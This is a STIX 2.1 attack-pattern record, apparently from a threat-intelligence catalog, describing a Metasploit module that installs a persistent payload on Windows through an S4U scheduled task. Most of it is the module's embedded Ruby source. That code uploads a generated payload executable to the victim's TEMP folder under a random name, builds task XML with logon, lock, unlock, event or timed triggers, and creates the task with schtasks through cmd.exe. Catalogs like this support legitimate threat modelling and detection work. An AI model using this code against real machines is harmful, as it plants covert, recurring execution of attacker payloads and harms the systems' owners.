{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f2228899-ca78-4097-92d5-694e5ed3f4ff",
    "created": "2024-08-14T16:49:58.752499Z",
    "modified": "2024-08-14T16:49:58.752503Z",
    "name": "Windows Manage User Level Persistent Payload Installer",
    "description": " Creates a scheduled task that will run using service-for-user (S4U). This allows the scheduled task to run even as an unprivileged user that is not logged into the device. This will result in lower security context, allowing access to local resources only. The module requires 'Logon as a batch job' permissions (SeBatchLogonRight).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/s4u_persistence.rb",
            "external_id": "s4u_persistence.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pentestgeek.com/2013/02/11/scheduled-tasks-with-s4u-and-on-demand-persistence/"
        },
        {
            "source_name": "reference",
            "url": "http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage User Level Persistent Payload Installer',\n        'Description' => %q{\n          Creates a scheduled task that will run using service-for-user (S4U).\n          This allows the scheduled task to run even as an unprivileged user\n          that is not logged into the device. This will result in lower security\n          context, allowing access to local resources only. The module\n          requires 'Logon as a batch job' permissions (SeBatchLogonRight).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>',\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>'\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Windows', {} ] ],\n        'DisclosureDate' => '2013-01-02', # Date of scriptjunkie's blog post\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'URL', 'http://www.pentestgeek.com/2013/02/11/scheduled-tasks-with-s4u-and-on-demand-persistence/' ],\n          [ 'URL', 'http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute']),\n        OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until trigger expires', 0]),\n        OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'schedule', ['event', 'lock', 'logon', 'schedule', 'unlock']]),\n        OptString.new('REXENAME', [false, 'Name of exe on remote system']),\n        OptString.new('RTASKNAME', [false, 'Name of task on remote system']),\n        OptString.new('PATH', [false, 'PATH to write payload', '%TEMP%'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event']),\n        OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.']),\n        OptString.new('XPATH', [false, 'XPath query'])\n      ]\n    )\n  end\n\n  def exploit\n    version = get_version_info\n    unless version.build_number >= Msf::WindowsVersion::Vista_SP0\n      fail_with(Failure::NoTarget, 'This module only works on Vista/2008 and above')\n    end\n\n    if datastore['TRIGGER'] == 'event' && (datastore['EVENT_LOG'].nil? || datastore['EVENT_ID'].nil?)\n      print_status('The properties of any event in the event viewer will contain this information')\n      fail_with(Failure::BadConfig, 'Advanced options EVENT_LOG and EVENT_ID required for event')\n    end\n\n    # Generate payload\n    payload = generate_payload_exe\n\n    # Generate remote executable name\n    rexename = generate_rexename\n\n    # Generate path names\n    xml_path, rexe_path = generate_path(rexename)\n\n    # Upload REXE to victim fs\n    upload_rexe(rexe_path, payload)\n\n    # Create basic XML outline\n    xml = create_xml(rexe_path)\n\n    # Fix XML based on trigger\n    xml = add_xml_triggers(xml)\n\n    # Write XML to victim fs, if fail clean up\n    write_xml(xml, xml_path, rexe_path)\n\n    # Name task with Opt or give random name\n    schname = datastore['RTASKNAME'] || Rex::Text.rand_text_alpha(rand(6..13))\n\n    # Create task with modified XML\n    create_task(xml_path, schname, rexe_path)\n  end\n\n  ##############################################################\n  # Generate name for payload\n  # Returns name\n  def generate_rexename\n    rexename = datastore['REXENAME'] || Rex::Text.rand_text_alpha(rand(6..13)) + '.exe'\n    if rexename !~ /\\.exe$/\n      print_warning(\"#{datastore['REXENAME']} isn't an exe\")\n    end\n    return rexename\n  end\n\n  ##############################################################\n  # Generate Path for payload upload\n  # Returns path for XML and payload\n  def generate_path(rexename)\n    # Generate a path to write payload and XML\n    path = datastore['PATH'] || session.sys.config.getenv('TEMP')\n    xml_path = \"#{path}\\\\#{Rex::Text.rand_text_alpha(rand(6..13))}.xml\"\n    rexe_path = \"#{path}\\\\#{rexename}\"\n    return xml_path, rexe_path\n  end\n\n  ##############################################################\n  # Upload the executable payload\n  # Returns boolean for success\n  def upload_rexe(path, payload)\n    vprint_status(\"Uploading #{path}\")\n\n    if file? path\n      fail_with(Failure::Unknown, \"File #{path} already exists... Exiting\")\n    end\n\n    begin\n      write_file(path, payload)\n    rescue StandardError\n      fail_with(Failure::Unknown, \"Could not upload to #{path}\")\n    end\n\n    print_good(\"Successfully Uploaded remote executable to #{path}\")\n  end\n\n  ##############################################################\n  # Creates a scheduled task, exports as XML, deletes task\n  # Returns normal XML for generic task\n  def create_xml(rexe_path)\n    xml_path = File.join(Msf::Config.data_directory, 'exploits', 's4u_persistence.xml')\n    xml_file = File.new(xml_path, 'r')\n    xml = xml_file.read\n    xml_file.close\n\n    # Get local time, not system time from victim machine\n    begin\n      vt = client.railgun.kernel32.GetLocalTime(32)\n      ut = vt['lpSystemTime'].unpack('v*')\n      t = ::Time.utc(ut[0], ut[1], ut[3], ut[4], ut[5])\n    rescue StandardError\n      print_warning('Could not read system time from victim... Using your local time to determine creation date')\n      t = ::Time.now\n    end\n    date = t.strftime('%Y-%m-%d')\n    time = t.strftime('%H:%M:%S')\n\n    # Put in correct times\n    xml = xml.gsub(/DATEHERE/, \"#{date}T#{time}\")\n\n    domain, user = client.sys.config.getuid.split('\\\\')\n\n    # Put in user information\n    xml = xml.sub(/DOMAINHERE/, user)\n    xml = xml.sub(/USERHERE/, \"#{domain}\\\\#{user}\")\n\n    xml = xml.sub(/COMMANDHERE/, rexe_path)\n    return xml\n  end\n\n  ##############################################################\n  # Takes the XML, alters it based on trigger specified. Will also\n  # add in expiration tag if used.\n  # Returns the modified XML\n  def add_xml_triggers(xml)\n    # Insert trigger\n    case datastore['TRIGGER']\n    when 'logon'\n      # Trigger based on winlogon event, checks windows license key after logon\n      print_status('This trigger triggers on event 4101 which validates the Windows license')\n      line = \"*[System[EventID='4101']] and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]\"\n      xml = create_trigger_event_tags('Application', line, xml)\n\n    when 'lock'\n      xml = create_trigger_tags('SessionLock', xml)\n\n    when 'unlock'\n      xml = create_trigger_tags('SessionUnlock', xml)\n\n    when 'event'\n      line = \"*[System[(EventID=#{datastore['EVENT_ID']})]]\"\n      if !datastore['XPATH'].nil? && !datastore['XPATH'].empty?\n        # Append xpath queries\n        line << \" and #{datastore['XPATH']}\"\n        # Print XPath query, useful to user to spot issues with uncommented single quotes\n        print_status(\"XPath query: #{line}\")\n      end\n\n      xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)\n\n    when 'schedule'\n      # Change interval tag, insert into XML\n      unless datastore['FREQUENCY'].nil? || datastore['FREQUENCY'] == 0\n        minutes = datastore['FREQUENCY']\n      else\n        print_status('Defaulting frequency to every hour')\n        minutes = 60\n      end\n      xml = xml.sub(/<Interval>.*?</, \"<Interval>PT#{minutes}M<\")\n\n      # Insert expire tag if not 0\n      unless datastore['EXPIRE_TIME'] == 0\n        # Generate expire tag\n        end_boundary = create_expire_tag\n        # Inject expire tag\n        insert = xml.index('</StartBoundary>')\n        xml.insert(insert + 16, \"\\n      #{end_boundary}\")\n      end\n    end\n    return xml\n  end\n\n  ##############################################################\n  # Creates end boundary tag which expires the trigger\n  # Returns XML for expire\n  def create_expire_tag\n    # Get local time, not system time from victim machine\n    begin\n      vt = client.railgun.kernel32.GetLocalTime(32)\n      ut = vt['lpSystemTime'].unpack('v*')\n      t = ::Time.utc(ut[0], ut[1], ut[3], ut[4], ut[5])\n    rescue StandardError\n      print_error('Could not read system time from victim... Using your local time to determine expire date')\n      t = ::Time.now\n    end\n\n    # Create time object to add expire time to and create tag\n    t += (datastore['EXPIRE_TIME'] * 60)\n    date = t.strftime('%Y-%m-%d')\n    time = t.strftime('%H:%M:%S')\n    end_boundary = \"<EndBoundary>#{date}T#{time}</EndBoundary>\"\n    return end_boundary\n  end\n\n  ##############################################################\n  # Creates trigger XML for session state triggers and replaces\n  # the time trigger.\n  # Returns altered XML\n  def create_trigger_tags(trig, xml)\n    domain, user = client.sys.config.getuid.split('\\\\')\n\n    # Create session state trigger, weird spacing used to maintain\n    # natural Winadows spacing for XML export\n    temp_xml = \"<SessionStateChangeTrigger>\\n\"\n    temp_xml << \"      #{create_expire_tag}\" unless datastore['EXPIRE_TIME'] == 0\n    temp_xml << \"      <Enabled>true</Enabled>\\n\"\n    temp_xml << \"      <StateChange>#{trig}</StateChange>\\n\"\n    temp_xml << \"      <UserId>#{domain}\\\\#{user}</UserId>\\n\"\n    temp_xml << '    </SessionStateChangeTrigger>'\n\n    xml = xml.gsub(%r{<TimeTrigger>.*</TimeTrigger>}m, temp_xml)\n\n    return xml\n  end\n\n  ##############################################################\n  # Creates trigger XML for event based triggers and replaces\n  # the time trigger.\n  # Returns altered XML\n  def create_trigger_event_tags(log, line, xml)\n    # Fscked up XML syntax for windows event #{id} in #{log}, weird spacind\n    # used to maintain natural Windows spacing for XML export\n    temp_xml = \"<EventTrigger>\\n\"\n    temp_xml << \"      #{create_expire_tag}\\n\" unless datastore['EXPIRE_TIME'] == 0\n    temp_xml << \"      <Enabled>true</Enabled>\\n\"\n    temp_xml << '      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" '\n    temp_xml << \"Path=\\\"#{log}\\\"&gt;&lt;Select Path=\\\"#{log}\\\"&gt;\"\n    temp_xml << line\n    temp_xml << '&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;'\n    temp_xml << \"</Subscription>\\n\"\n    temp_xml << '    </EventTrigger>'\n\n    xml = xml.gsub(%r{<TimeTrigger>.*</TimeTrigger>}m, temp_xml)\n    return xml\n  end\n\n  ##############################################################\n  # Takes the XML and a path and writes file to filesystem\n  # Returns boolean for success\n  def write_xml(xml, path, rexe_path)\n    if file? path\n      delete_file(rexe_path)\n      fail_with(Failure::Unknown, \"File #{path} already exists... Exiting\")\n    end\n    begin\n      write_file(path, xml)\n    rescue StandardError\n      delete_file(rexe_path)\n      fail_with(Failure::Unknown, \"Issues writing XML to #{path}\")\n    end\n    print_good(\"Successfully wrote XML file to #{path}\")\n  end\n\n  ##############################################################\n  # Takes path and delete file\n  # Returns boolean for success\n  def delete_file(path)\n    file_rm(path)\n  rescue StandardError\n    print_warning(\"Could not delete file #{path}, delete manually\")\n  end\n\n  ##############################################################\n  # Takes path and name for task and creates final task\n  # Returns boolean for success\n  def create_task(path, schname, rexe_path)\n    # create task using XML file on victim fs\n    create_task_response = cmd_exec('cmd.exe', \"/c schtasks /create /xml #{path} /tn \\\"#{schname}\\\"\")\n    if create_task_response =~ /has successfully been created/\n      print_good(\"Persistence task #{schname} created successfully\")\n\n      # Create to delete commands for exe and task\n      del_task = \"schtasks /delete /tn \\\"#{schname}\\\" /f\"\n      print_status(\"#{'To delete task:'.ljust(20)} #{del_task}\")\n      print_status(\"#{'To delete payload:'.ljust(20)} del #{rexe_path}\")\n      del_task << \"\\ndel #{rexe_path}\"\n\n      # Delete XML from victim\n      delete_file(path)\n\n      # Save info to notes DB\n      report_note(host: session.session_host,\n                  type: 'host.s4u_persistance.cleanup',\n                  data: {\n                    session_num: session.sid,\n                    stype: session.type,\n                    desc: session.info,\n                    platform: session.platform,\n                    via_payload: session.via_payload,\n                    via_exploit: session.via_exploit,\n                    created_at: Time.now.utc,\n                    delete_commands: del_task\n                  })\n    elsif create_task_response =~ /ERROR: Cannot create a file when that file already exists/\n      # Clean up\n      delete_file(rexe_path)\n      delete_file(path)\n      error = 'The scheduled task name is already in use'\n      fail_with(Failure::Unknown, error)\n    else\n      error = 'Issues creating task using XML file schtasks'\n      vprint_error(\"Error: #{create_task_response}\")\n      if (datastore['EVENT_LOG'] == 'Security') && (datastore['TRIGGER'] == 'Event')\n        print_warning('Security log can restricted by UAC, try a different trigger')\n      end\n      # Clean up\n      delete_file(rexe_path)\n      delete_file(path)\n      fail_with(Failure::Unknown, error)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-02, # Date of scriptjunkies blog post",
    "x_mitre_platforms": [
        "win'"
    ]
}